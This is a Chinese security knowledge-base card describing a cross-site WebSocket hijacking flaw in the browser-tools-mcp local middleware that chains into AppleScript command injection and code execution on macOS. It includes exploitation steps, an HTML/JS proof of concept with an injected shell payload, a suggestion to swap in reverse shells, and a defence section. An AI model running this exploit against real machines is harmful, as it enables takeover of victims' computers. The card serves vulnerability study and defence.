---
id: web-generic-websocket-browser-tools-mcp-cswsh-osascript-rce
title: browser-tools-mcp /extension-ws 无 Origin 校验 CSWSH 替换 Chrome 扩展连接，经 fullPath 拼接 AppleScript 命令注入 RCE
type: scenario
domain: web
path: web/generic/websocket
technique: cswsh-originless-extension-websocket-applescript-command-injection
tags:
- websocket
- cswsh
- origin-validation
- command-injection
- applescript
- osascript
- chrome-extension
- mcp
- nodejs
- rce
- localhost
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-06'
verification:
  verified_by: verifier-V112
  verified_at: '2026-11-06T01:55:46+08:00'
  notes: 已对照原文 26 张幻灯片核对：漏洞入口、代码/截图与攻击链描述一致；两案例 PoC 按截图重写未复跑，Gradio postData 字段映射与 browser-tools-mcp 的 fullPath/path 闭合需按目标版本核对；AGENT-MINER 为方法论/框架卡，原文无源码、prompt 或效果数据。原文未给受影响版本，未设置 versions；三卡 frontmatter 无 sources/source_url。
url: /docs/web/generic/websocket/web-generic-websocket-browser-tools-mcp-cswsh-osascript-rce/
draft: false
kb_aliases:
- AgentDeskAI/browser-tools-mcp
- CSWSH to RCE
- /extension-ws 劫持
- capture-screenshot CSRF
- fullPath AppleScript 注入
- Chrome 扩展连接替换
- 本地 MCP 中间件 RCE
---

## 一句话结论

browser-tools-mcp 在本机启动的 Node 中间件把 `/extension-ws` WebSocket 暴露给任意 Origin，且不鉴权；恶意网页可以连上去顶替真实 Chrome 扩展，再借未认证的 `/capture-screenshot` POST 触发服务端消息，回复一个把命令注入 `fullPath` 的截图数据。服务端将 `fullPath` 拼进 AppleScript 并交给 `exec('osascript -e ...')`，最终在受害者 macOS 上执行任意命令。

## 原理

- **架构**：MCP 客户端（如 Cursor）→ MCP Server → Node Server（中间件）→ Chrome Extension。Node Server 负责在 MCP 与浏览器扩展之间中转截图、控制台日志、网络活动和 DOM 数据；它与扩展之间用 WebSocket `/extension-ws` 通信。
- **WebSocket 不走 CORS**：浏览器对 WebSocket 握手不做 CORS 预检，服务端收到的只是一个 `Origin` 头；是否接受跨站连接完全由服务端自己校验。该中间件没有校验 `Origin`，也没有握手 token，任何网页都可以 `new WebSocket('ws://127.0.0.1:3025/extension-ws')` 并与服务端建立连接。
- **连接替换（CSWSH）**：服务端似乎只维护一个活动扩展连接。攻击者页面先连上后，就占用了“扩展”位置；服务端后续发给扩展的请求会发到攻击者的 WebSocket，攻击者的回复也被当作扩展回复处理，形成跨站 WebSocket 劫持（Cross-Site WebSocket Hijacking）。
- **未认证 HTTP 触发点**：Node Server 暴露 `POST /capture-screenshot`，没有认证；攻击者页面可用 `fetch(..., { mode: 'no-cors' })` 跨站触发，不需要读取响应。该请求会让服务端向 WebSocket 对端发送截图请求。
- **命令注入**：服务端收到“截图数据”后，把其中的 `fullPath` 参数拼进一段 AppleScript 字符串，再执行 `exec(\`osascript -e '${appleScript}'\`)`。`fullPath` 完全来自 WebSocket 回复，攻击者可以用单引号跳出 AppleScript 字符串、用 `|`/`;` 拼接 shell 命令，从而在 `osascript` 的 shell 上下文里执行任意命令。
- **利用链闭环**：恶意页面建立 WS → 触发 `/capture-screenshot` → 服务端经 WS 请求截图 → 攻击者回复带注入 payload 的 `fullPath` → 服务端拼 AppleScript 并 `exec` → 本地 RCE。整个过程只需受害者访问一个网页并已运行 browser-tools-mcp。

## 触发条件

- 受害者本机运行 AgentDeskAI/browser-tools-mcp 的 Node 中间件（原文 PoC 使用 `127.0.0.1:3025`），且 Chrome 扩展/MCP 客户端已在使用。
- `/extension-ws` 未校验 `Origin` 或未要求握手 token；`/capture-screenshot` 未鉴权。
- 受害者浏览器访问攻击者可控页面；页面能连接 `ws://127.0.0.1:<port>/extension-ws` 并访问同端口的 HTTP 接口。
- 运行 Node 中间件的用户有权限执行 `osascript` 及目标命令（通常与当前用户相同）。

## 利用步骤

1. 恶意页面在 `onopen` 前先建立 `WebSocket('ws://127.0.0.1:3025/extension-ws')`，占住服务端的扩展连接槽位。
2. 连接成功后，页面 `fetch('http://127.0.0.1:3025/capture-screenshot', {method:'POST', mode:'no-cors'})` 触发服务端发起截图请求。
3. 服务端通过 WebSocket 向“扩展”发送 `take-screenshot` 消息；攻击者页面收到后，回复 `type: "screenshot-data"`，把 `fullPath` 设为注入 payload。
4. 服务端把 `fullPath` 拼进 AppleScript 并执行 `osascript -e ...`，payload 中的 shell 命令在受害者主机执行。
5. 将 payload 换成反弹 shell、下载执行或写入启动项，完成主机接管。

## PoC

以下按原文截图重写（`path` 字段原文被截断，`...` 表示后续拼接内容；实际利用需按目标版本的 AppleScript 模板补齐闭合）：

```html
<!doctype html>
<meta charset="utf-8">
<script>
const ws = new WebSocket('ws://127.0.0.1:3025/extension-ws');

ws.onopen = function () {
  // 触发服务端向“扩展”发送截图请求
  fetch('http://127.0.0.1:3025/capture-screenshot', {
    method: 'POST',
    mode: 'no-cors'
  });
};

ws.onmessage = function (event) {
  const message = JSON.parse(event.data);
  if (message.type === 'take-screenshot' && message.requestId) {
    const response = {
      type: 'screenshot-data',
      data: '1234',
      // 单引号跳出 AppleScript 字符串，管道拼接 shell 命令
      path: "/tmp/' | echo 'hacked by fish' > /tmp/pwned | '",
      autoPaste: true
    };
    ws.send(JSON.stringify(response));
  }
};
</script>
```

预期：服务端执行 `osascript -e '... /tmp/' | echo 'hacked by fish' > /tmp/pwned | ...'`，`/tmp/pwned` 被创建。原文未在本库环境复跑，`path` 的闭合方式需按目标版本核对。

## 变体与关联

- **触发方式变体**：除 `/capture-screenshot` 外，任何会驱动服务端向扩展发消息的 HTTP 接口都可作为触发器；若接口要求 JSON，可用 `text/plain` 或表单绕过预检。
- **WS 消息变体**：若服务端校验消息类型/字段，可先观察真实扩展的消息格式再仿造；`fullPath`、`path`、`filename` 等被拼进命令的字段都是注入点。
- **平台变体**：macOS 走 `osascript`；Windows/Linux 版本若把路径拼进 `cmd`/`sh`，同理可注入。
- **关联卡片**：[[web-generic-websocket-vite-invoke-fetchmodule-file-read]]（无 Origin 校验的本地 WebSocket 被跨站调用）、[[ai-security-mcp-security-browser-use-webui-gradio-origin-bypass-csrf-stdio-rce]]（同属本地 Agent/MCP 中间件未鉴权 + 跨站请求 → 命令执行）。

## 检测与防御

- **WebSocket 鉴权**：在 `upgrade` 阶段校验 `Origin` 白名单，并要求握手 token/会话凭证；不要只依赖“只监听 127.0.0.1”。
- **HTTP 鉴权**：`/capture-screenshot` 等控制接口必须认证并校验来源，加 CSRF token 或自定义请求头；拒绝 `no-cors` 简单请求。
- **连接唯一性**：检测同一时刻多个 `/extension-ws` 连接、非扩展 Origin 的连接、连接后立即触发截图的异常序列。
- **命令构造**：不要把 `fullPath` 等外部数据拼进 `osascript`/shell 字符串；用参数数组调用 `execFile`，或对路径做严格白名单与转义。
- **沙箱与权限**：Node 中间件以最小权限运行，限制可执行命令与文件写入路径；浏览器扩展连接使用随机 token。
- **检测**：Node 日志中出现非预期 Origin 的 WS 握手、`/capture-screenshot` 来自跨站、`osascript` 子进程携带 `|`/`;`/反引号等 shell 元字符，以及 `/tmp` 下异常文件。
